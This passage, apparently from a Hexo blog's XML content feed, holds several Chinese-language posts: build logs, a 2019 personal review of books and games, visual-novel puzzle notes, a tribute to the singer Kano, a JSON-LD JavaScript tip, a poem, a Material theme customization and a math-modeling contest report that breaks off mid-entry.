public/js/funnytitle.js[18:46:54] Compress JS: public/js/gitalk.min.js[18:46:56] Compress JS: public/js/hanabi-browser-bundle.js[18:46:57] Compress JS: public/js/ie-blocker.en.js[18:46:57] Compress JS: public/js/ie-blocker.zhCN.js[18:46:57] Compress JS: public/js/jquery.min.js[18:46:58] Compress JS: public/js/js.js[18:46:59] Compress JS: public/js/js.min.js[18:46:59] Compress JS: public/js/lazyload.min.js[18:47:00] Compress JS: public/js/lsloader.js[18:47:00] Compress JS: public/js/lsloader.min.js[18:47:00] Compress JS: public/js/md5.min.js[18:47:00] Compress JS: public/js/nprogress.js[18:47:00] Compress JS: public/js/prettify.min.js[18:47:00] Compress JS: public/js/queue.js[18:47:00] Compress JS: public/js/queue.min.js[18:47:00] Compress JS: public/js/smoothscroll.js[18:47:00] Compress JS: public/js/gallery/gallery.js[18:47:00] Compress JS: 21 items[18:47:01] Finished &#39;compressJs&#39; after 9.22 s[18:47:01] Starting &#39;deploy&#39;...INFO  Deploying: gitINFO  Setting up Git deployment...</code></pre><pre><code>INFO  178 files generated in 2.71 s[19:17:09] Finished &#39;generate&#39; after 5.07 s[19:17:09] Starting &#39;compressHtml&#39;...[19:17:09] Compress HTML: public/404.html[19:17:09] Compress HTML: public/index.html[19:17:09] Compress HTML: public/laycomment.html[19:17:09] Compress HTML: public/about/index.html[19:17:10] Compress HTML: public/categories/index.html[19:17:10] Compress HTML: public/archives/2019-nian-du-zong-jie.html[19:17:10] Compress HTML: public/archives/bu-shu-gitalk-chu-xian-de-keng.html[19:17:10] Compress HTML: public/archives/gulp-de-shen-qi-bug.html[19:17:10] Compress HTML: public/archives/how-to-walk-tiny-little-life.html[19:17:11] Compress HTML: public/archives/index.html[19:17:11] Compress HTML: public/archives/lu-nai-samfree.html[19:17:11] Compress HTML: public/archives/material-geng-duo-xin-xi.html[19:17:11] Compress HTML: public/archives/our-end-of-the-world.html[19:17:11] Compress HTML: public/archives/tzmcm-bi-sai-guo-cheng-jie-guo.html[19:17:11] Compress HTML: public/archives/xian-chong-du-bao-zha-ba.html[19:17:12] Compress HTML: public/archives/yin-se-feng-jing.html[19:17:12] Compress HTML: public/archives/zai-html-zhong-yong-js-cao-zuo-json.html[19:17:12] Compress HTML: public/kami/index.html[19:17:12] Compress HTML: public/links/index.html[19:17:12] Compress HTML: public/timeline/index.html[19:17:13] Compress HTML: public/categories/日常/index.html[19:17:13] Compress HTML: public/categories/代码/index.html[19:17:13] Compress HTML: public/categories/随想/index.html[19:17:13] Compress HTML: public/categories/知识/index.html[19:17:13] Compress HTML: public/archives/2019/index.html[19:17:13] Compress HTML: public/archives/2020/index.html[19:17:13] Compress HTML: public/page/2/index.html[19:17:13] Compress HTML: public/page/3/index.html[19:17:14] Compress HTML: public/archives/2019/07/index.html[19:17:14] Compress HTML: public/archives/page/3/index.html[19:17:14] Compress HTML: public/archives/2019/09/index.html[19:17:14] Compress HTML: public/archives/2019/10/index.html[19:17:14] Compress HTML: public/archives/page/2/index.html[19:17:14] Compress HTML: public/archives/2020/01/index.html[19:17:14] Compress HTML: public/archives/2019/11/index.html[19:17:14] Compress HTML: public/archives/2020/02/index.html[19:17:15] Compress HTML: public/archives/2020/03/index.html[19:17:15] Compress HTML: public/archives/2019/page/2/index.html[19:17:15] Compress HTML: 38 items[19:17:15] Finished &#39;compressHtml&#39; after 6.32 s[19:17:15] Starting &#39;compressCss&#39;...[19:17:15] Compress CSS: public/css/disqus-proxy.css[19:17:15] Compress CSS: public/css/duoshuo.css[19:17:15] Compress CSS: public/css/gitalk.css[19:17:15] Compress CSS: public/css/ie-blocker.css[19:17:15] Compress CSS: public/css/material-icons.css[19:17:15] Compress CSS: public/css/material.css[19:17:16] Compress CSS: public/css/prettify.css[19:17:16] Compress CSS: public/css/style.css[19:17:16] Compress CSS: public/css/uc.css[19:17:16] Compress CSS: 9 items[19:17:16] Finished &#39;compressCss&#39; after 1.08 s[19:17:16] Starting &#39;deploy&#39;...INFO  Deploying: gitINFO  Clearing .deploy_git folder...</code></pre><p>两次的 build 是不一样的，但是生成的文件却相同。</p><p>相同的文件也由于不同的 build 产生了不同的结果。</p><p>问题尚未解决。因为没时间就先把记录留在这里。<br>若在别处得到了答案，我会在第一时间补充博客。</p><h2 id="After-Day"><a href="#After-Day" class="headerlink" title="After Day"></a>After Day</h2><p>这篇文章原计划是 2 月初便要写的，咕了一段时间后连着 3 月那篇闲聊发了出来。</p><p>日期就随便糊了个单身狗的日子（简称狗日的）</p><p>顺便封面也是可爱的狗狗（是幼犬酱啦~）</p><p>疾病盛行，小心出行。</p>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>六月与高挂夜空的半月</title>
      <link href="archives/2019-nian-du-zong-jie.html"/>
      <url>archives/2019-nian-du-zong-jie.html</url>
      
        <content type="html"><![CDATA[<p>2019 年度总结</p><a id="more"></a><p>「记忆与情感，正因为短暂而显珍贵」</p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>之前没写过年度总结，但去年稍显特别。在寒假期间安静下来后，便也想写点东西来纪念纪念（趁我还没忘干净）</p><p>Google Analytics 月访问量稳定在 30-40（实际未知，cloudflare 给出数据是 1000），和隔壁大佬比起来简直相形见绌，并感谢所有访问者。</p><p>去年依旧没项目，一直鸽着（</p><p>博客依旧用的全白嫖服务，在去年底是打算用赞助的 J1900 做个 Server，搬了家后，新地方只能嫖楼下 WiFi。</p><p>博客的 UX 即使改过很多次也不是很满意。高考完有空会重写一次博客 UX。</p><h2 id="Past-Tense"><a href="#Past-Tense" class="headerlink" title="Past Tense"></a>Past Tense</h2><h3 id="书"><a href="#书" class="headerlink" title="书"></a>书</h3><p>这一部分很多废话，如果你不想浪费宝贵时间，请直接点开目录并选择性浏览。</p><ul><li><p>eBook &amp; Lightnovel<br>春物、友少、有妹、三坪、神的记事本、慌坏、望月、夏娜以及一堆科幻等等，其余想不起的 eBook 都在 Kindle 中，但我的 Kindle 在高三初，也就是去年 9 月被学校收了。台购和港购的轻小说有「三个我与四个她的双人游戏」、「世界什么的怎样都好」1-2、以及不想说的很多……买纪念的有「友少港版」12、「刀剑神域uw」19、「春物港版」13。还有三秋搥的六本轻小说（目前没看「君の话」）、少女编号全、「星之声」「云之彼端」新海诚这系列的好几本。也有「麦田的守望者」「人间失格」「罗生门」，咸鱼 100 块捡的「讲道理，你没有我可爱」1-8（不好看很失望）</p></li><li><p>ADV（归为书这一类是因为我认为其文字表现是主体）<br>包括常说的 Galgame。拔作众多就不讲了。去年最喜欢的 NVL 是橘子班的「Tiny Snow」，巫贼大大的画真的是非常可爱（国内推），不乏对爱情的思考，里面涉及到的很多哲理，我在过去的读书中都有共感，个人甚至去找炒饭大大要了文本。个人而言是神作，一辈子难忘的作品。TAVG 中感触很深的有「Deliver me」，这也是我在 Steam 平台玩的较早的游戏。还有千恋、色鸟鸟、光鸟鸟、Sweet&amp;Tea 的三部作品、纸魔人、温泉乡、Recette、沙耶之歌（没玩完丢了存档，现在不想玩了）、D 社、三色绘恋等等，不对着打了。妹系的还是小品居多，其中大多也只是卖肉，看好的也就有兽娘养成计划和 WABISHABI，不过也只是看好，剧情方面显然不足，角色塑造也不够就开始卖肉了。哲理性的 ADV 依旧不多，本人也逐渐对没完没了的拔作、废萌感到疲倦，有些甚至不如 steam 的免费 NVL。业界的堕落显而易见。这些失去创作灵魂的东西，也只配成为时代的产物。真正的辉煌，永远充满了人性的思考、闪烁着理性的光辉。</p></li><li><p>实体书<br>算上 Kindle 和实体书（除去以上两类），图书馆借的自己买的，大概 40 多本（至少）。我也不想去翻了，能想到的就有人类简史、未来简史、社会心理学、岸本的几本书、几本诗歌集、局外人和鼠疫、便利店和山茶店、百年孤独、被埋葬的巨人、美妙的新世界、内向者优势、平凡的世界、超脱、几本悬疑推理、在路上、周国平的和柏拉图的、樊登的、罪与罚、麦田的守望者、知更鸟女孩 1-3、亲爱的安德烈、我们仨、萤火虫。好了，也有很多书评，不过没整理过，很多只是写在日记上。特别想提出来的是罪与罚，真是太 tm 有魅力了，很多场景的描写都富含诗意，比如饱受欺辱的女孩选择了跳江那部分，有青年选择给钱救女孩的那部分，艺术上特别是对环境简化的描写，是一大特色（反正我是写不出），咋看咋顺眼，看完还想看的那种感觉吧。</p></li></ul><p>此外还有一些漫画、绘本，以及一大堆咕咕咕的计算机书籍。</p><h3 id="番剧"><a href="#番剧" class="headerlink" title="番剧"></a>番剧</h3><p>「少女编号」。这是继美术社、new game 之后，第三部值得留在盘里反复品味的佳作。起因是轻小说前传吸引了我，然后这部番的剧情真的好到超出我的预料（还有老渡的疯狂自黑与业界黑）<br>「比宇宙更远的地方」。其实是年前看的，不必多说，BD 预购了。</p><h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ul><li><code>Bootstrap 3</code> -&gt; <code>Bootstrap 4</code>（目前咕到一半多）</li><li><code>HTML</code> -&gt; <code>Flask</code>（喵喵喵？）</li><li><code>Python 2</code> -&gt; <code>Python 3</code> + <code>numpy</code> + <code>pandas</code> + <code>plt</code></li><li><code>PHP</code> -&gt; <code>Laravel</code></li><li>完善了前年写的两个静态页面，一个登陆页面（未开源）</li><li>一些 Python on Raspberrypi 的自做小程序</li><li>咕掉的 imgbot ci</li><li>咕掉的 Python 物理图像分析与函数求解</li><li>咕掉的单片机实验</li><li>咕掉的自制无人机</li><li>咕掉的音乐 MAD 制作</li><li>咕掉的一些 PR</li></ul><h3 id="生活中的变化-2019"><a href="#生活中的变化-2019" class="headerlink" title="生活中的变化-2019"></a>生活中的变化-2019</h3><ul><li>卡布奇诺 -&gt; 特浓咖啡（我是卡布奇诺党~~</li><li>手绘 -&gt; 板绘（只熟悉了笔触和线稿</li><li>开始吃褪黑素</li><li>轻小说构思进展（笔稿和电子稿接近 1 万字算进展吗</li><li>认识了两位国轻作家</li><li>7.31 开始写日记</li><li>10.31 了了个小<code>心结</code></li><li>浏览器书签 +300~</li><li>Muse Dash 100+</li><li><a href="https://blog.tinyume.com/archives/tzmcm-bi-sai-guo-cheng-jie-guo.html">数学建模与数据分析</a></li></ul><h3 id="Kernel-Panic"><a href="#Kernel-Panic" class="headerlink" title="Kernel Panic"></a>Kernel Panic</h3><p>Fatel exception: Dumping (relocation in 0x00509102)<br>Fatel exception: Dumping (relocation in 0x02909102)</p><h3 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h3><p>Life is a bunch of shit<br>Life is a bitch<br>I thought we could be good people<br>Loved by everyone<br>But God doesn’t want us to<br>He would rather we do the dishes<br>Freedom looks like a bit of bullshit<br>That’s just how life owns you<br>So, fuck God.</p><h2 id="Future-Tense"><a href="#Future-Tense" class="headerlink" title="Future Tense"></a>Future Tense</h2><p>无迹可寻，却早已注定。</p><blockquote><p>四下都没有人的气息。<br>大街上到处都是漂亮的白色高楼，<br>就如同绘画纸搭建的模型一样，仿若是<br>虚假的光景。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我和她的世界末日</title>
      <link href="archives/our-end-of-the-world.html"/>
      <url>archives/our-end-of-the-world.html</url>
      
        <content type="html"><![CDATA[<p>个人的谜题解法和通关记录</p><a id="more"></a><p>Steam 秋促喜加一，买了橘子班的两部游戏</p><p>此游戏谜题众多，于是记录一下本人的一些谜解</p><h2 id="第三章-B-线"><a href="#第三章-B-线" class="headerlink" title="第三章 B 线"></a>第三章 B 线</h2><h3 id="A-区【密码锁】"><a href="#A-区【密码锁】" class="headerlink" title="A 区【密码锁】"></a>A 区【密码锁】</h3><p>一个勉强能跑的 Python 算法:</p><pre><code>output = []for a in range(1,10):    for b in range(1,10):        for c in range(1,10):            for d in range(1,10):                for e in range(1,10):                    for f in range(1,10):                        for g in range (1,10):                            for h in range(1,10):                                for i in range(1,10):                                    if (a*100000000+b*10000000+c*1000000+d*100000+e*10000+f*1000+g*100+h*10+i)*i+a*10 == 1111111111*a:                                        output.append([a, b, c, d, e, f, g, h, i])                                        print(output)</code></pre><p>输出为 1-9 的顺序列表，以此对应密码锁的密码为【3】【9】【2】</p><h3 id="W-区【椅子摆动规律】"><a href="#W-区【椅子摆动规律】" class="headerlink" title="W 区【椅子摆动规律】"></a>W 区【椅子摆动规律】</h3><p>将上个房间得到的奇怪文字横着摆放，大概是下列形式（请以左为上竖置）<br><code>P-R-N-D-2-LP→N→D→L→R→2</code></p><p>按照指针顺序在列表做指向，向上即为前进，向下即为后退</p><p>得出规律【后】【后】【后】【前】【后】</p><h2 id="0"><a href="#0" class="headerlink" title="0"></a>0</h2><p>总游戏时长 16 小时</p><p>未完成【END 16】【Ture END】【Happy END】</p><p>两个隐藏成就未解锁</p><p>【END 16】是在 3A4B 时不选择探索并增加好感，难怪总找不出来（医生居然猜中了我是为全成就而来</p><p>【Ture End】解释游戏的设计，表明了在世界末日中未能拯救女主的真男主为自己设计了这个虚拟游戏，去揭秘他想要的「真相」，大概是想明白自己的「选择」是否正确，真正的男主并不是现实中的那个，「美好的，幸福的，悲伤的，痛苦的」可以对应上 4 个 NE，最后暗示真男主死了。</p><p>【Happy END】这个是跟着【True END】的，TE 竟然要在 Branch 停留 10s，还以为是【END 16】的充分条件未解锁然后刷关刷到心竭…此 END 是现实男主的后来生活和某些连上【True End】剧情的解读，真男主死去后，复活作为「引路人」即引导游戏进入第三章的那个陌生人，其中存在伪命题悖论，如果是真正的影响了过去现实世界，按照游戏剧情女主应该进入避难所活了下来，这样就不会产生 HE 了，但实际上，后面所说的话又是在警告现实男主，然而这个游戏不就是你自己设计然后玩的吗？？？自己杀自己？hmm，「这副躯体不是我的，看来要回【避难所】了」，看到这里大概可以明白，这只是他个人的宣泄罢了，是对自己在虚拟游戏中愧对女主行为的忏悔。最后终于回到「现实？」讲述游戏的发展，玩到最后，也不太想去追究什么现实或是虚幻，什么是对什么是错，或许这才是游戏作者想传递的吧？</p><p>TE 的目的并不都在于去解释这个游戏，而是说，要去把握重视的东西，即便一开始便知道自己最终无法得到，也要珍惜自己的情感，珍惜其对于人生的重要意义。</p><p>游戏还有两篇番外小说「我和她和他的世界末日」「末日之后与秩序之前」…三个人的相互依偎和 TE 的后续，值得期待。</p><p>以下为本人的思维导图<br>Download: <a href="https://cdn.jsdelivr.net/gh/iyume/hexo-blog@gh-pages/末日.xmind" rel="noopener" target="_blank">末日.xmind</a></p><p>Who can like shelter?</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kano ~ samfree</title>
      <link href="archives/lu-nai-samfree.html"/>
      <url>archives/lu-nai-samfree.html</url>
      
        <content type="html"><![CDATA[<p>2019-9-24 [ 鹿乃 ] スペシャル配信ライブ</p><a id="more"></a><p><meting-js server="netease" type="playlist" id="3052740726"></meting-js><br>说实话，信息量和情感有点大，都不知道从何谈起了，首先是一句「对不起」，然后还能想到的是「我来晚了」</p><p>这一次的话题我想了想，自己也没法劝导别人看开，也没法说出「生老病死是常态」亦或是「逝者已去，重要的是活着」这些话，生活有诸多不顺，每个人的经历也不尽相同，但有一点可以确信，这只是无数个让你成长的经历中的一个</p><p>背景故事：samfree 是 V 家和 U 家的著名 P 主，于 2015 年 9 月 24 日因疾病不幸去世，享年 31 岁，而此年正好是鹿乃的出道年，可以说，samfree 对鹿乃的支持不可或缺，两人也是很好的朋友</p><p>2019-1-07 鹿乃 Radio スケジュール更新</p><blockquote><p><a href="http://www.teichiku.co.jp/artist/kano/" rel="noopener" target="_blank">Teichiku Records</a></p></blockquote><p>2019-9-20 鹿乃专辑「いつかの約束を君に」（汉译「与你曾经的约定」）发行消息</p><blockquote><p><a href="https://twitter.com/kano_2525/status/1175040396872712192" rel="noopener" target="_blank">Twitter</a></p></blockquote><p>2019-9-24 Youtube 鹿乃 スペシャル配信ライブ </p><blockquote><p><a href="https://kano-official.amebaownd.com/posts/6980180" rel="noopener" target="_blank">Official</a><br><a href="https://twitter.com/kano_2525/status/1176507956516421632" rel="noopener" target="_blank">Twitter</a></p></blockquote><p>2019-9-25 スペシャル配信ライブ 录音</p><blockquote><p><a href="https://www.youtube.com/watch?v=lgmbj0-wS68" rel="noopener" target="_blank">Youtube</a></p></blockquote><p>收录曲总共有 8 首（云村似乎超快上专辑的<br>都是 samfree 未完成的歌曲</p><p>在 Youtube 的录音前段听到了鹿乃的抽泣声，可能 samfree 一直是鹿乃心中的一道伤吧</p><p>鹿乃虽然主打萌系，但和大多数萌系唱见不一样，从鹿乃的歌声中我更能听出一种救赎的感觉，这也是我单推鹿乃的原因</p><p>不管别人怎么看，我觉得，不仅仅因为这 8 首歌的词本身带悲伤色彩，更能听出鹿乃削减了以往可爱的风格，换上略带悲伤的嗓音，在努力地想要传达自己的声音给在天堂的 samfree</p><p>文章这张缩略图是鹿乃带白菊的图片，同时手握吉他代表着对 samfree 从前的怀念，整幅图配上音乐让我鼻头有点发酸</p><p>不管是失败、成功、放弃、妥协，肯定都只是人生的一部分，没有什么可以作为人生的评判标准，或悲伤、开心、苦闷、迷惑，我都会支持着鹿乃</p><p>希望鹿乃可以尽快适应，拥有自己的强大力量，努力实现自己的理想！</p>]]></content>
      
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS 操作 Json DOM</title>
      <link href="archives/zai-html-zhong-yong-js-cao-zuo-json.html"/>
      <url>archives/zai-html-zhong-yong-js-cao-zuo-json.html</url>
      
        <content type="html"><![CDATA[<p>操作 json in label 的奇淫方法</p><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在修复结构化数据时，尝试使用原生 JS 去操作含在 html 标签内的 Json</p><h2 id="简易实现方法"><a href="#简易实现方法" class="headerlink" title="简易实现方法"></a>简易实现方法</h2><h3 id="Json-Example"><a href="#Json-Example" class="headerlink" title="Json Example"></a>Json Example</h3><pre><code>&lt;script id=&quot;myjsonid&quot; type=&quot;application/ld+json&quot;&gt;    {        &quot;headline&quot;: &quot;&quot;,        &quot;datePublished&quot;: &quot;&quot;,        &quot;dateModified&quot;: &quot;&quot;,        &quot;image&quot;: &quot;&quot; // 不能添逗号否则 parse 报错    }&lt;/script&gt;</code></pre><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><pre><code>const script = document.getElementById(&quot;myjsonid&quot;);script.firstChild.nodeValue = &#39;{&quot;headline&quot;: &quot;myheadline&quot;, &quot;datePublished&quot;: &quot;1024-1024-1024&quot;, &quot;dateModified&quot;: &quot;1024-1024-1024&quot;, &quot;image&quot;: &quot;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg&quot;}&#39;; // Completely replace it</code></pre><h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><pre><code>const script = document.getElementById(&quot;myjsonid&quot;);script.textContent = &#39;{&quot;headline&quot;: &quot;myheadline&quot;, &quot;datePublished&quot;: &quot;1024-1024-1024&quot;, &quot;dateModified&quot;: &quot;1024-1024-1024&quot;, &quot;image&quot;: &quot;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg&quot;}&#39;; // Completely replace it</code></pre><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><pre><code>&lt;script id=&quot;myjsonid&quot; type=&quot;application/ld+json&quot;&gt;{&quot;headline&quot;: &quot;myheadline&quot;, &quot;datePublished&quot;: &quot;1024-1024-1024&quot;, &quot;dateModified&quot;: &quot;1024-1024-1024&quot;, &quot;image&quot;: &quot;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg&quot;}&lt;/script&gt;</code></pre><p>这样毫无疑问很麻烦，如果只想要改一对键值的话，全部替换岂不要命？<br>上面方法只是操作了 Json 字符串，但是 JS 娘还有各种操作 Json 对象的方法，那么可以将其转化为对象然后再偷梁换柱一波</p><h2 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h2><pre><code>const script = document.getElementById(&quot;myjsonid&quot;);const obj = JSON.parse(script.firstChild.nodeValue);obj.headline = &quot;myheadline&quot;;obj.datePublished = &quot;1024-1024-1024&quot;;obj.dateModified = &quot;1024-1024-1024&quot;;obj.image = &quot;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg&quot;;script.firstChild.nodeValue = JSON.stringify(obj); // Also use script.textContent</code></pre>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>银色风景</title>
      <link href="archives/yin-se-feng-jing.html"/>
      <url>archives/yin-se-feng-jing.html</url>
      
        <content type="html"><![CDATA[<p>景色系列</p><a id="more"></a><hr><p>黎明</p><p>消失在地平线上</p><p>我</p><p>站在十字交错处</p><p>一个人变成两个人，世界的范围变大了，孤单的范围变小了；两个人变成一个人，世界的范围变小了，孤单的范围变大了</p><p>我却喜欢独自一人</p><p>在时间里探寻着未来的颜色</p><p>一人独行，孤单无助</p><p>该从哪里找到答案</p><p>因为一道身影始终伴随着我</p><p>所以怀着满心的期待</p><p>将颤抖的双手伸向不知何处</p><p>想得到却总像被透明的玻璃挡住</p><p>明明近在咫尺</p><p>却又遥不可及</p><p>无数次，无数次地回过头</p><p>在悄静旷然的清晨</p><p>在雨中晰黎的午后</p><p>在风雪纷飞的黄昏</p><p>在半月悬空的夜晚</p><p>不断寻找着不知藏身何处的声音</p><p>在光影交错间</p><p>总是无法将那身影抓入手心</p><p>孤单已成习惯</p><p>一个人不够的话</p><p>那就努力变强</p><p>即便看不清夜空的颜色</p><p>也要努力睁开眼</p><p>只要不放弃</p><p>一定可以一点一点地</p><p>变得强大</p><p>我将会强到无人可挡</p><p>所以</p><p>你要等着我</p><p>想要看看你，亲手感受你的存在，想要和你去做一大堆事情</p><p>明知道这是不可能实现的愿望</p><p>却还是期盼着靠近你</p><p>即便无法传递思念的心情</p><p>即便近而不可及的距离分开了我们</p><p>每次抬头仰望半月的夜空时</p><p>想见你的心情就会愈加强烈</p><p>起码现在</p><p>在未雨绸缪处</p><p>能够静静守护便足矣</p><p>我们生来不是为了死，是为了活下去</p><p>喜欢，就要倾注一切去追寻</p><p>前方有无法预料的明天</p><p>不必悲伤，不必难过</p><p>因为有你，因为有明天</p><p>因为心中有爱，所以不曾退缩</p><p>今天是希望，明天是绝望</p><p>那么，仅需紧握住今天的希望，将明天的绝望打破就行了</p><p>在绝望来临之前</p><p>还不是向世界妥协的时候</p><p>还有你陪着我</p><p>我将满怀绝望的思念</p><p>拾起武器向前方挥去</p><p>To 妄想症</p>]]></content>
      
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>让 Material 文章更加人性化</title>
      <link href="archives/material-geng-duo-xin-xi.html"/>
      <url>archives/material-geng-duo-xin-xi.html</url>
      
        <content type="html"><![CDATA[<p>给 Material 文章页添加字数统计、阅读时长和分类标签</p><a id="more"></a><h2 id="适用于"><a href="#适用于" class="headerlink" title="适用于"></a>适用于</h2><ul><li>Hexo-Material</li></ul><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>看见 Material 的文章页太简陋了，去网上查了查好像没人搞这个，于是自己动手，添加字数统计插件后完美加上了字数统计和阅读时长预计，在添加分类标签时查阅了 Hexo 开发文档，发现<code>list_categories()</code>正好能满足需求（才怪咧</p><p>这个方法打印出的分类标签会包含此分类的文章数，就像 <strong>Python2</strong>、<strong>闲谈4</strong> 这样，看上去极其不美观，一开始想用 ejs 格式化字符串，然而 ejs 似乎并没有格式化方法，然后翻了翻格式化的 npm 包，过于复杂选择弃掉，最后选用原生 js 去除数字，而后添加 Ant Design Icon，至此文章信息添加完成</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>好吧，发现了其实有如下的方法可以去除数字<del>（hexo 的官方文档真垃圾</del></p><pre><code>&lt;%- list_categories(post.categories, {    show_count: false,    class: &#39;post_category&#39;,    style: &#39;none&#39;}) %&gt;</code></pre><h2 id="Inplement"><a href="#Inplement" class="headerlink" title="Inplement"></a>Inplement</h2><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><pre><code>npm install --save hexo-wordcount</code></pre><h3 id="添加-HTML-元素"><a href="#添加-HTML-元素" class="headerlink" title="添加 HTML 元素"></a>添加 HTML 元素</h3><p>找到<code>material/layout/post.ejs</code><br>搜索<code>&lt;%- partial(&#39;_partial/post-content&#39;) %&gt;</code><br>在其上面一行添加以下代码</p><pre><code>&lt;div class=&quot;post-preface&quot;&gt;    &lt;span class=&quot;post-preface-count&quot;&gt;        &lt;i&gt;&lt;img class=&quot;post-preface-icons&quot; src=&quot;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-count.svg&quot;&gt;&lt;/i&gt;        &lt;%= wordcount(partial(&#39;_partial/post-content&#39;)) %&gt;字    &lt;/span&gt;    &lt;span class=&quot;post-preface-minread&quot;&gt;        &lt;i&gt;&lt;img class=&quot;post-preface-icons&quot; src=&quot;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-minread.svg&quot;&gt;&lt;/i&gt;        大约&lt;%= min2read(partial(&#39;_partial/post-content&#39;)) %&gt;分钟    &lt;/span&gt;    &lt;% if(is_post()){ %&gt;    &lt;span class=&quot;post-preface-categories&quot;&gt;        &lt;i&gt;&lt;img class=&quot;post-preface-icons&quot; src=&quot;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-categories-1.svg&quot;&gt;&lt;/i&gt;        &lt;%- list_categories(page.categories, {            style: &#39;p&#39;,                transform(str) {                    return titlecase(str);                }            }) %&gt;    &lt;/span&gt;&lt;/div&gt;</code></pre><h3 id="添加-CSS-样式"><a href="#添加-CSS-样式" class="headerlink" title="添加 CSS 样式"></a>添加 CSS 样式</h3><p>还是在<code>material/layout/post.ejs</code><br>随便找个适当的位置插入以下 Style 标签就行啦</p><pre><code>&lt;style&gt;    .post-preface {        margin: 15px 0 0 4%;    }    .post-preface-count,    .post-preface-minread,    .post-preface-categories {        border-radius: 10px;        margin: auto 3px;        padding: 5px 10px;        font-size: 14px;        color: white;        display: inline-block;        letter-spacing: 1px;    }    .post-preface-count {        background-color: #ff4e6a;    }    .post-preface-minread {        background-color: #ffaa73;    }    .post-preface-categories {        background-color: #3cdc82;    }    .category-link {        text-decoration: none;    }    .category-link:hover,    .category-link:link,    .category-link:visited,    .category-link:active {        color: white;    }    .post-preface-icons {        filter: invert(100%);    }&lt;/style&gt;</code></pre><p>可能有人已经察觉到了这个 CSS 颜色反转滤镜，但我懒得改了（</p><h3 id="添加-JS-清洗字符串"><a href="#添加-JS-清洗字符串" class="headerlink" title="添加 JS 清洗字符串"></a>添加 JS 清洗字符串</h3><p>依旧是<code>material/layout/post.ejs</code><br>将以下 JS 插入到刚才添加的 html 元素下方任意位置</p><blockquote><p>一定要在插入元素的下方，因为 html 是自上而下解释的</p></blockquote><pre><code>&lt;script&gt;    for (i = 0; i &lt; document.getElementsByClassName(&quot;category-link&quot;).length; i++) {        document.getElementsByClassName(&quot;category-link&quot;)[i].innerHTML = document.getElementsByClassName(&quot;category-link&quot;)[i].innerHTML.replace(/[0-9]/g, &#39;&#39;);    }&lt;/script&gt;</code></pre><p>END<br>顺便鬼灭之刃真香！</p>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TZMCM 比赛过程 &amp; 结果</title>
      <link href="archives/tzmcm-bi-sai-guo-cheng-jie-guo.html"/>
      <url>archives/tzmcm-bi-sai-guo-cheng-jie-guo.html</url>
      
        <content type="html"><![CDATA[<p>今年有缘参与了数学建模网络挑战赛并取得了两个优秀奖</p><a id="more"></a><h2 id="比赛时间"><a href="#比赛时间" class="headerlink" title="比赛时间"></a>比赛时间</h2><blockquote><p>第一阶段：北京时间2019年4月19日下午20:00时——4月22日下午20:00时<br>第二阶段：北京时间2019年5月17日下午20:00时——5月20日下午20:00时</p></blockquote><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>被数学老师叫去让我组织参加这个比赛，经历几个月最终募集好了三人团队<del>（绝对不是我没有朋友，肯定是没什么人想参加，嗯</del><br>今天发布了第二阶段证书的电子版，顺便写下了这篇博文</p><h2 id="我干了啥"><a href="#我干了啥" class="headerlink" title="我干了啥"></a>我干了啥</h2><p>充当队里的辣鸡程序猿，并使用了世界上最好的语言 <strong>Python</strong> 完成两场比赛的代码编写<br>作为没有经过任何培训的一个专科(高二)组，基本很难和本科组、研究生组比肩，嘛，爽就完事了（</p><h2 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h2><blockquote><p>队号: 1360</p></blockquote><h3 id="相关地址"><a href="#相关地址" class="headerlink" title="相关地址:"></a>相关地址:</h3><blockquote><p>Source: <a href="https://github.com/iyume/code-tzmcm-12th" rel="noopener" target="_blank">https://github.com/iyume/code-tzmcm-12th</a><br>WebPage: <a href="https://code.iyume.cc" rel="noopener" target="_blank">https://code.iyume.cc</a></p></blockquote><p>论文已在<a href="http://madio.net" rel="noopener" target="_blank">数学中国</a>开放下载</p><h3 id="最终成绩"><a href="#最终成绩" class="headerlink" title="最终成绩"></a>最终成绩</h3><p><strong>第一阶段:</strong></p><blockquote><p>分数: <code>55</code><br>排名: <code>2075/3971</code><br>简短评语: 排版有些问题，缺少对数据的预处理</p></blockquote><p><strong>第二阶段</strong></p><blockquote><p>分数: <code>41</code><br>排名: <code>1311/1653</code><br>简短评语: 